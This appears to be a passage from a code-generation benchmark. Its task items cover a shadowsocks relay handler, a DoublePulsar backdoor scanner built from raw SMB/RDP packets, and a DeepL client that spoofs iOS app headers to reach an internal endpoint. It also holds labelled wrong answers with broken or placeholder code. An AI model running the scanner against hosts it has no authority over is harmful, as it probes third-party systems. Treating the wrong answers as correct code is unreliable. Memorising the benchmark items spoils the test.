    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local client and a remote server, handling socket connections, data encryption, and protocol obfuscation.\n\nClass Description: The TCPRelayHandler class is responsible for managing the relay of TCP traffic between a local client and a remote server. It handles socket creation, connection management, data encryption/decryption, and protocol obfuscation. The class integrates with an event loop for asynchronous I/O operations.\n\nAttributes:\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to handler instances\n- _loop: [object] - Event loop instance for I/O multiplexing\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket (IPv4)\n- _remote_sock_v6: [socket.socket] - Remote server socket (IPv6)\n- _remote_udp: [bool] - Flag indicating UDP mode\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating local mode\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption handler\n- _encrypt_correct: [bool] - Encryption status flag\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _fastopen_connected: [bool] - TCP Fast Open status\n- _data_to_write_to_local: [list] - Buffer for data to local client\n- _data_to_write_to_remote: [list] - Buffer for data to remote server\n- _udp_data_send_buffer: [bytes] - UDP data buffer\n- _upstream_status: [int] - Upstream connection status\n- _downstream_status: [int] - Downstream connection status\n- _client_address: [tuple] - Local client address\n- _remote_address: [tuple] - Remote server address\n- _forbidden_iplist: [list] - List of blocked IP addresses\n- _chosen_server: [object] - Selected server instance\n- last_activity: [int] - Timestamp of last activity\n\nMethods:\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> None - Initializes the handler with server configuration and sockets\n- _create_remote_socket(ip, port) -> socket.socket - Creates and configures a remote socket connection\n- _write_to_sock(data, sock) -> bool - Writes data to a socket with encryption/obfuscation\n- destroy() -> None - Cleans up resources and closes all connections\n- _update_activity() -> None - Updates the last activity timestamp\n- _get_a_server() -> object - Selects an appropriate server from configuration\n- _handle_dns_resolved(result, error) -> None - Callback for DNS resolution\n- _update_stream(stream, status) -> None - Updates stream status in event loop\n- _on_local_read() -> None - Handles local socket read events\n- _on_remote_read() -> None - Handles remote socket read events\n- _on_local_write() -> None - Handles local socket write events\n- _on_remote_write() -> None - Handles remote socket write events",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport traceback\nimport random\nfrom shadowsocks import encrypt, obfs, eventloop, shell, common\nfrom shadowsocks.common import pre_parse_header, parse_header\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._encryptor = encrypt.Encryptor(config['password'], config['method'])\n        self._encrypt_correct = True\n        self._obfs = obfs.obfs(config['obfs'])\n        server_info = obfs.server_info(server.obfs_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = config['obfs_param']\n        self._obfs.set_server_info(server_info)\n        self._protocol = obfs.obfs(config['protocol'])\n        server_info = obfs.server_info(server.protocol_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = ''\n        self._protocol.set_server_info(server_info)\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = WAIT_STATUS_READING\n        self._downstream_status = WAIT_STATUS_INIT\n        self._client_address = local_sock.getpeername()[:2]\n        self._remote_address = None\n        if 'forbidden_ip' in config:\n            self._forbidden_iplist = config['forbidden_ip']\n        else:\n            self._forbidden_iplist = None\n        if is_local:\n            self._chosen_server = self._get_a_server()\n        fd_to_handlers[local_sock.fileno()] = self\n        local_sock.setblocking(False)\n        local_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n        self.last_activity = 0\n        self._update_activity()\n        self._server.add_connection(1)\n\n    def _create_remote_socket(self, ip, port):\n        if self._remote_udp:\n            addrs_v6 = socket.getaddrinfo(\"::\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n            addrs = socket.getaddrinfo(\"0.0.0.0\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n        else:\n            addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        if len(addrs) == 0:\n            raise Exception(\"getaddrinfo failed for %s:%d\" % (ip, port))\n        af, socktype, proto, canonname, sa = addrs[0]\n        if self._forbidden_iplist:\n            if common.to_str(sa[0]) in self._forbidden_iplist:\n                raise Exception('IP %s is in forbidden list, reject' % common.to_str(sa[0]))\n        remote_sock = socket.socket(af, socktype, proto)\n        self._remote_sock = remote_sock\n        self._fd_to_handlers[remote_sock.fileno()] = self\n\n        if self._remote_udp:\n            af, socktype, proto, canonname, sa = addrs_v6[0]\n            remote_sock_v6 = socket.socket(af, socktype, proto)\n            self._remote_sock_v6 = remote_sock_v6\n            self._fd_to_handlers[remote_sock_v6.fileno()] = self\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n\n        remote_sock.setblocking(False)\n        if self._remote_udp:\n            remote_sock_v6.setblocking(False)\n        else:\n            remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        return remote_sock\n\n    def _write_to_sock(self, data, sock):\n        if not sock:\n            return False\n        uncomplete = False\n        if self._remote_udp and sock == self._remote_sock:\n            try:\n                self._udp_data_send_buffer += data\n                while len(self._udp_data_send_buffer) > 6:\n                    length = struct.unpack('>H', self._udp_data_send_buffer[:2])[0]\n                    if length > len(self._udp_data_send_buffer):\n                        break\n                    data = self._udp_data_send_buffer[:length]\n                    self._udp_data_send_buffer = self._udp_data_send_buffer[length:]\n                    frag = common.ord(data[2])\n                    if frag != 0:\n                        logging.warn('drop a message since frag is %d' % (frag,))\n                        continue\n                    else:\n                        data = data[3:]\n                    header_result = parse_header(data)\n                    if header_result is None:\n                        continue\n                    connecttype, dest_addr, dest_port, header_length = header_result\n                    addrs = socket.getaddrinfo(dest_addr, dest_port, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n                    if addrs:\n                        af, socktype, proto, canonname, server_addr = addrs[0]\n                        data = data[header_length:]\n                        if af == socket.AF_INET6:\n                            self._remote_sock_v6.sendto(data, (server_addr[0], dest_port))\n                        else:\n                            sock.sendto(data, (server_addr[0], dest_port))\n            except Exception as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            return True\n        else:\n            try:\n                if self._is_local:\n                    pass\n                else:\n                    if sock == self._local_sock and self._encrypt_correct:\n                        obfs_encode = self._obfs.server_encode(data)\n                        data = obfs_encode\n                if data:\n                    l = len(data)\n                    s = sock.send(data)\n                    if s < l:\n                        data = data[s:]\n                        uncomplete = True\n                else:\n                    return\n            except (OSError, IOError) as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            except Exception as e:\n                shell.print_exception(e)\n                self.destroy()\n                return False\n        if uncomplete:\n            if sock == self._local_sock:\n                self._data_to_write_to_local.append(data)\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_WRITING)\n            elif sock == self._remote_sock:\n                self._data_to_write_to_remote.append(data)\n                self._update_stream(STREAM_UP, WAIT_STATUS_WRITING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        else:\n            if sock == self._local_sock:\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_READING)\n            elif sock == self._remote_sock:\n                self._update_stream(STREAM_UP, WAIT_STATUS_READING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        return True\n\n    def destroy(self):\n        if self._stage == STAGE_DESTROYED:\n            return\n        self._stage = STAGE_DESTROYED\n        if self._remote_sock:\n            try:\n                self._loop.remove(self._remote_sock)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock.fileno()]\n            self._remote_sock.close()\n            self._remote_sock = None\n        if self._remote_sock_v6:\n            try:\n                self._loop.remove(self._remote_sock_v6)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock_v6.fileno()]\n            self._remote_sock_v6.close()\n            self._remote_sock_v6 = None\n        if self._local_sock:\n            self._loop.remove(self._local_sock)\n            del self._fd_to_handlers[self._local_sock.fileno()]\n            self._local_sock.close()\n            self._local_sock = None\n        if self._obfs:\n            self._obfs.dispose()\n            self._obfs = None\n        if self._protocol:\n            self._protocol.dispose()\n            self._protocol = None\n        self._dns_resolver.remove_callback(self._handle_dns_resolved)\n        self._server.remove_handler(self)\n        self._server.add_connection(-1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport select\nimport time\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._encrypt_correct = True\n        self._obfs = None\n        self._protocol = None\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = 0\n        self._downstream_status = 0\n        self._client_address = local_sock.getpeername()\n        self._remote_address = None\n        self._forbidden_iplist = config.get('forbidden_ip', [])\n        self._chosen_server = None\n        self.last_activity = int(time.time())\n\n    def _create_remote_socket(self, ip, port):\n        if ':' in ip:\n            remote_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n        else:\n            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        remote_sock.setblocking(False)\n        return remote_sock\n\n    def _write_to_sock(self, data, sock):\n        if self._encryptor:\n            data = self._encryptor.encrypt(data)\n        if self._obfs:\n            data = self._obfs.obfuscate(data)\n        try:\n            sock.sendall(data)\n            return True\n        except BlockingIOError:\n            return False\n\n    def destroy(self):\n        if self._local_sock:\n            self._local_sock.close()\n        if self._remote_sock:\n            self._remote_sock.close()\n        if self._remote_sock_v6:\n            self._remote_sock_v6.close()\n\n    def _update_activity(self):\n        self.last_activity = int(time.time())\n\n    def _get_a_server(self):\n        # Logic to select a server based on configuration\n        pass\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            print(f\"DNS resolution error: {error}\")\n            return\n        self._remote_address = result[0]\n        self._connect_to_remote()\n\n    def _update_stream(self, stream, status):\n        # Update stream status in event loop\n        pass\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(4096)\n        if not data:\n            self.destroy()\n            return\n        self._update_activity()\n        if self._remote_sock:\n            if not self._write_to_sock(data, self._remote_sock):\n                self._update_stream(self._remote_sock.fileno(), select.EPOLLOUT)\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(4096)\n        if not data:\n            self.destroy()\n            return\n        self._update_activity()\n        if self._local_sock:\n            if not self._write_to_sock(data, self._local_sock):\n                self._update_stream(self._local_sock.fileno(), select.EPOLLOUT)\n\n    def _on_local_write(self):\n        if self._data_to_write_to_local:\n            data = self._data_to_write_to_local.pop(0)\n            if not self._write_to_sock(data, self._local_sock):\n                self._data_to_write_to_local.insert(0, data)\n                self._update_stream(self._local_sock.fileno(), select.EPOLLOUT)\n\n    def _on_remote_write(self):\n        if self._data_to_write_to_remote:\n            data = self._data_to_write_to_remote.pop(0)\n            if not self._write_to_sock(data, self._remote_sock):\n                self._data_to_write_to_remote.insert(0, data)\n                self._update_stream(self._remote_sock.fileno(), select.EPOLLOUT)\n```"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Implement a class to detect the presence of DoublePulsar implants in SMB and RDP services on a target IP address using TCP socket communication.\n\nClass Description: The DoublePulsar class provides functionality to check for the presence of DoublePulsar backdoor implants in SMB (port 445) and RDP (port 3389) services. It handles protocol-specific packet crafting, socket communication, and response analysis.\n\nAttributes:\n- ip: str - Target IP address to scan (default: \"127.0.0.1\")\n- timeout: float - Socket timeout in seconds (default: None)\n- verbose: bool - Flag for verbose output (default: False)\n- ssl_negotiation_request: bytes - Predefined RDP SSL negotiation packet\n- non_ssl_negotiation_request: bytes - Predefined RDP non-SSL negotiation packet\n- non_ssl_client_data: bytes - Predefined RDP non-SSL client data packet\n- ssl_client_data: bytes - Predefined RDP SSL client data packet\n- ping_packet: bytes - Predefined RDP ping packet\n- negotiate_protocol_request: bytes - Predefined SMB negotiation packet\n- session_setup_request: bytes - Predefined SMB session setup packet\n- tree_connect_request: bytes - Predefined SMB tree connect packet\n- trans2_session_setup: bytes - Predefined SMB trans2 session setup packet\n\nMethods:\n- check_ip_smb() -> tuple[bool, str] - Checks for DoublePulsar implant via SMB protocol\n  Returns tuple containing detection status and message\n- check_ip_rdp() -> tuple[bool, str] - Checks for DoublePulsar implant via RDP protocol\n  Returns tuple containing detection status and message\n- _calculate_doublepulsar_xor_key(s: int) -> int - Internal method to calculate XOR key from signature\n  Takes signature value as input, returns calculated key",
    "Canonical_solution": "import socket\nimport ssl\nimport struct\nimport binascii\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n\n        # RDP Packets\n        self.ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080001000000\")\n        self.non_ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080000000000\")\n        self.non_ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ping_packet = binascii.unhexlify(\"0300000e02f0803c443728190200\")\n\n        # SMB Packets\n        self.negotiate_protocol_request = binascii.unhexlify(\"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        self.session_setup_request = binascii.unhexlify(\"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        self.tree_connect_request = binascii.unhexlify(\"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        self.trans2_session_setup = binascii.unhexlify(\"0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000\")\n\n    def check_ip_smb(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 445))\n\n        s.send(self.negotiate_protocol_request)\n        s.recv(1024)\n\n        s.send(self.session_setup_request)\n        session_setup_response = s.recv(1024)\n        user_id = session_setup_response[32:34]\n\n        modified_tree_connect_request = list(self.tree_connect_request)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = \"\".join(modified_tree_connect_request)\n\n        s.send(modified_tree_connect_request)\n        tree_connect_response = s.recv(1024)\n        tree_id = tree_connect_response[28:30]\n\n        modified_trans2_session_setup = list(self.trans2_session_setup)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = \"\".join(modified_trans2_session_setup)\n\n        s.send(modified_trans2_session_setup)\n        final_response = s.recv(1024)\n        s.close()\n\n        if final_response[34] == \"\\x51\":\n            signature = final_response[18:26]\n            signature_long = struct.unpack('<Q', signature)[0]\n            key = self._calculate_doublepulsar_xor_key(signature_long)\n            return True, f\"DoublePulsar SMB implant detected XOR KEY: {hex(key)}\"\n        return False, \"No presence of DOUBLEPULSAR SMB implant\"\n\n    def check_ip_rdp(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 3389))\n\n        s.send(self.ssl_negotiation_request)\n        negotiation_response = s.recv(1024)\n\n        if len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x02\" and negotiation_response[15] == \"\\x01\":\n            sock = ssl.wrap_socket(s)\n            s = sock\n            s.send(self.ssl_client_data)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x02\":\n            s.close()\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(float(self.timeout) if self.timeout else None)\n            s.connect((self.ip, 3389))\n            s.send(self.non_ssl_negotiation_request)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x05\":\n            s.close()\n            return False, \"Server requires NLA, which DOUBLEPULSAR does not support\"\n        else:\n            s.send(self.non_ssl_client_data)\n            s.recv(1024)\n\n        s.send(self.ping_packet)\n        try:\n            ping_response = s.recv(1024)\n            s.close()\n            if len(ping_response) == 288:\n                return True, \"DoublePulsar SMB implant detected\"\n            return False, f\"Status Unknown - Response received but length was {len(ping_response)} not 288\"\n        except socket.error:\n            return False, \"No presence of DOUBLEPULSAR RDP implant\"\n\n    def _calculate_doublepulsar_xor_key(self, s):\n        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8))\n        return x & 0xffffffff",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport struct\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n        self.ssl_negotiation_request = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.non_ssl_negotiation_request = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.non_ssl_client_data = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.ssl_client_data = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.ping_packet = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.negotiate_protocol_request = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.session_setup_request = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.tree_connect_request = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n        self.trans2_session_setup = b'\\x03\\x00\\x00\\x2f\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x31\\x20\\x34\\x30\\x30\\x20\\x42\\x61\\x64\\x20\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x0d\\x0a\\x43\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x2d\\x54\\x79\\x70\\x65\\x3a\\x20\\x74\\x65\\x78\\x74\\x2f\\x68\\x74\\x6d\\x6c\\x0d\\x0a\\x0d\\x0a'\n\n    def check_ip_smb(self) -> tuple[bool, str]:\n        # Implementation for SMB check\n        pass\n\n    def check_ip_rdp(self) -> tuple[bool, str]:\n        # Implementation for RDP check\n        pass\n\n    def _calculate_doublepulsar_xor_key(self, s: int) -> int:\n        # Implementation for XOR key calculation\n        pass\n```"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a function to translate text using the DeepL API with HTTP client functionality, supporting multiple language translations and alternative translations.\n\nFunction Description: The function uses the httpx library to send HTTP POST requests to the DeepL API endpoint. It handles text translation between specified source and target languages, with options for requesting alternative translations and proxy support. The function includes error handling for HTTP status codes and processes the JSON response to extract translated text.\n\nInput:\n- text: (str) - The text to be translated\n- sourceLang: (str, optional) - Source language code (auto-detected if None)\n- targetLang: (str, optional) - Target language code (defaults to \"EN\")\n- numberAlternative: (int, optional) - Number of alternative translations to request (0-3)\n- printResult: (bool, optional) - Whether to print the translation result\n- proxies: (dict, optional) - Proxy configuration for the HTTP client\n\nOutput:\n- If numberAlternative <= 1: returns (str) - The translated text\n- If numberAlternative > 1: returns (list[str]) - List of alternative translations\n- Returns None if HTTP request fails (non-200 status)\n- Raises TooManyRequestsException on HTTP 429 status",
    "Canonical_solution": "import random\nimport time\nimport json\nimport httpx\nfrom langdetect import detect\n\ndeeplAPI = \"https://www2.deepl.com/jsonrpc\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"*/*\",\n    \"x-app-os-name\": \"iOS\",\n    \"x-app-os-version\": \"16.3.0\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"x-app-device\": \"iPhone13,2\",\n    \"User-Agent\": \"DeepL-iOS/2.9.1 iOS 16.3.0 (iPhone13,2)\",\n    \"x-app-build\": \"510265\",\n    \"x-app-version\": \"2.9.1\",\n    \"Connection\": \"keep-alive\",\n}\n\ndef translate(\n    text,\n    sourceLang=None,\n    targetLang=None,\n    numberAlternative=0,\n    printResult=False,\n    proxies=None,\n):\n    iCount = getICount(text)\n    id = getRandomNumber()\n\n    if sourceLang is None:\n        sourceLang = detectLang(text)\n    if targetLang is None:\n        targetLang = \"EN\"\n\n    numberAlternative = max(min(3, numberAlternative), 0)\n\n    postData = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"LMT_handle_texts\",\n        \"id\": id,\n        \"params\": {\n            \"texts\": [{\"text\": text, \"requestAlternatives\": numberAlternative}],\n            \"splitting\": \"newlines\",\n            \"lang\": {\n                \"source_lang_user_selected\": sourceLang,\n                \"target_lang\": targetLang,\n            },\n            \"timestamp\": getTimestamp(iCount),\n            \"commonJobParams\": {\n                \"wasSpoken\": False,\n                \"transcribe_as\": \"\",\n            },\n        },\n    }\n    postDataStr = json.dumps(postData, ensure_ascii=False)\n\n    if (id + 5) % 29 == 0 or (id + 3) % 13 == 0:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\" : \"', -1)\n    else:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\": \"', -1)\n\n    with httpx.Client(proxies=proxies) as client:\n        resp = client.post(url=deeplAPI, data=postDataStr, headers=headers)\n        respStatusCode = resp.status_code\n\n        if respStatusCode == 429:\n            raise TooManyRequestsException\n            return \n\n        if respStatusCode != 200:\n            print(\"Error\", respStatusCode)\n            return\n\n        respText = resp.text\n        respJson = json.loads(respText)\n\n        if numberAlternative <= 1:\n            targetText = respJson[\"result\"][\"texts\"][0][\"text\"]\n            if printResult:\n                print(targetText)\n            return targetText\n\n        targetTextArray = []\n        for item in respJson[\"result\"][\"texts\"][0][\"alternatives\"]:\n            targetTextArray.append(item[\"text\"])\n            if printResult:\n                print(item[\"text\"])\n\n        return targetTextArray",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nfrom typing import Optional, Dict, Union, List\n\nclass TooManyRequestsException(Exception):\n    pass\n\ndef translate_text(text: str, sourceLang: Optional[str] = None, targetLang: str = \"EN\", \n                   numberAlternative: int = 0, printResult: bool = False, \n                   proxies: Optional[Dict[str, str]] = None) -> Union[str, List[str], None]:\n    url = \"https://api-free.deepl.com/v2/translate\"\n    auth_key = \"YOUR_AUTH_KEY\"  # Replace with your actual DeepL API key\n    headers = {\"Authorization\": f\"DeepL-Auth-Key {auth_key}\"}\n    data = {\n        \"text\": text,\n        \"target_lang\": targetLang\n    }\n    if sourceLang:\n        data[\"source_lang\"] = sourceLang\n    if numberAlternative > 0:\n        data[\"split_sentences\"] = \"nonewlines\"\n        data[\"formality\"] = \"default\"\n    \n    try:\n        response = httpx.post(url, headers=headers, data=data, proxies=proxies)\n        response.raise_for_status()\n        json_response = response.json()\n        translations = [item['text'] for item in json_response['translations']]\n        \n        if numberAlternative <= 1:\n            